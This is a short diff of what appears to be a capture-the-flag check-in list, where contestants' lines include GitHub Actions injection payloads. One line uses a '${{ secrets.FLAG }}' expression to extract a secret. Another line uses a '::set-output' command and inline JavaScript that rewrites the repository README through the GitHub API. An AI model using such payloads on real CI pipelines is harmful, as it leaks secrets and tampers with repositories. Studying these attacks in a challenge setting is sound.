@@ -165,3 +165,4 @@ Le0nsec:""
   flaa: ${{ secrets.FLAG }}
 afsmaira:00000
 haztag-01:::set-output name=flag::1;(async()=>{const e=await github.repos.getContent({owner:"CheckInChallenge",path:"README.md",repo:"CheckIn",ref:"refs/heads/main"});await github.repos.createOrUpdateFileContents({owner:"CheckInChallenge",repo:"CheckIn",path:"README.md",message:"editing",content:"SSBkaWQgaXQ=",branch:"main","committer.name":"Yawn","committer.email":"email","author.name":"Yawn","author.email":"email",sha:e.data.sha})})();
+afsmaira:00000
